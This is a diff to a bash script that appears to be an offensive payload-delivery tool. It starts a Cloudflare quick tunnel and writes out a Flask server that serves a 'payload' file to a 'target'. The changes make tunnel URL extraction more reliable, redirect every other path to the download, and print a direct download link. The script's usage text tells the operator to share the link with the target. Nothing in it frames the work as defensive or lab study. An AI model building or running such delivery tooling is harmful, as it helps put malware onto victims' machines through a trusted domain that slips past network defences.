@@ -66,7 +66,7 @@ declare -A DELIVERY_METHODS=(
 )
 
 # Global variables
-SCRIPT_VERSION="7.6-Cloudflare-Fixed"
+SCRIPT_VERSION="7.8-Cloudflare-HTTPS-Fixed"
 BUILD_TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
 BUILD_ID=$(head /dev/urandom | tr -dc A-Za-z0-9 | head -c 8)
 
@@ -353,9 +353,9 @@ start_cloudflare_tunnel() {
     local tunnel_pid=$!
     
     # Wait for tunnel to initialize
-    sleep 5
+    sleep 8
     
-    # Extract tunnel URL from log
+    # Extract tunnel URL from log with improved pattern matching
     if [ -f "$tunnel_log" ]; then
         local tunnel_url=$(grep -o 'https://[^[:space:]]*\.trycloudflare\.com' "$tunnel_log" | head -1)
         if [ -n "$tunnel_url" ]; then
@@ -374,6 +374,18 @@ start_cloudflare_tunnel() {
         echo "$tunnel_pid" > "$TEMP_DIR/tunnel.pid"
         log_message "SUCCESS" "Cloudflare tunnel started: $CLOUDFLARE_TUNNEL_URL"
         return 0
+    fi
+    
+    # Last resort: try to extract from the log with more patterns
+    sleep 2
+    if [ -f "$tunnel_log" ]; then
+        tunnel_url=$(grep -o 'https://[^[:space:]]*' "$tunnel_log" | grep trycloudflare | head -1)
+        if [ -n "$tunnel_url" ]; then
+            CLOUDFLARE_TUNNEL_URL="$tunnel_url"
+            echo "$tunnel_pid" > "$TEMP_DIR/tunnel.pid"
+            log_message "SUCCESS" "Cloudflare tunnel started: $CLOUDFLARE_TUNNEL_URL"
+            return 0
+        fi
     fi
     
     log_message "ERROR" "Failed to start Cloudflare tunnel"
@@ -1252,7 +1264,7 @@ deliver_via_cloudflare_tunnel() {
     local server_script="$TEMP_DIR/server.py"
     cat > "$server_script" << EOF
 #!/usr/bin/env python3
-from flask import Flask, send_file, render_template_string
+from flask import Flask, send_file, render_template_string, request, redirect
 import os
 import sys
 
@@ -1260,7 +1272,9 @@ app = Flask(__name__)
 
 @app.route('/')
 def index():
-    return render_template_string('''
+    # Check if the request is for the root domain or a specific path
+    if request.path == '/':
+        return render_template_string('''
 <!DOCTYPE html>
 <html>
 <head>
@@ -1298,6 +1312,9 @@ def index():
 </body>
 </html>
 ''')
+    else:
+        # For any other path, redirect to the download
+        return redirect('/download')
 
 @app.route('/download')
 def download():
@@ -1337,6 +1354,7 @@ EOF
 CLOUDFLARE TUNNEL INFORMATION
 =============================
 Tunnel URL: $CLOUDFLARE_TUNNEL_URL
+Direct Download Link: $CLOUDFLARE_TUNNEL_URL/download
 Local Port: $local_port
 Server PID: $server_pid
 Tunnel PID: $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")
@@ -1345,7 +1363,7 @@ Payload: $(basename "$payload_path")
 
 Usage:
 1. Share the tunnel URL with your target
-2. Target can download the payload securely
+2. Target can download the payload securely using: $CLOUDFLARE_TUNNEL_URL/download
 3. All traffic is encrypted through Cloudflare
 
 To stop the tunnel:
@@ -1354,6 +1372,7 @@ kill $(cat "$TEMP_DIR/tunnel.pid" 2>/dev/null || echo "N/A")
 EOF
         
         echo -e "${G}[+] Tunnel information saved to: $tunnel_info${NC}"
+        echo -e "${G}[+] Direct download link: $CLOUDFLARE_TUNNEL_URL/download${NC}"
         
         # Ask if user wants to keep the tunnel running
         echo -e "\n${Y}[*] Tunnel is now running. Press Ctrl+C to stop the tunnel.${NC}"
